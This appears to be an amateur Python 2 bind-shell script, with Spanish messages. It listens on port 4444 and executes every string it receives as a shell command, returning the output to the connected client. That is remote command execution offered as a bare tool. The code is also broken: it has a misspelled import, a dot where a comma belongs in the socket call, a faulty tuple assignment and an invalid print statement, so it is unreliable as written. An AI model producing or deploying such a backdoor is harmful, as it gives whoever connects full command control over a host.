import socket
import comands

serversocket = socket.socket(socket.AF_INET.socket.SOCK_STREAM)

serversocket.bind(('localhost',4444))

serversocket.listen(1)

clientsocket.clienadress = serversocket.accept()

print "conexion desde la ip: ",clienadress

while True:
    data = clientsocket.recv(1024)
    print "client %s" data
    respuesta = commands.getoutput(data)
    clientsocket.send(respuesta)

    if not respuesta:break
clientsocket.close()
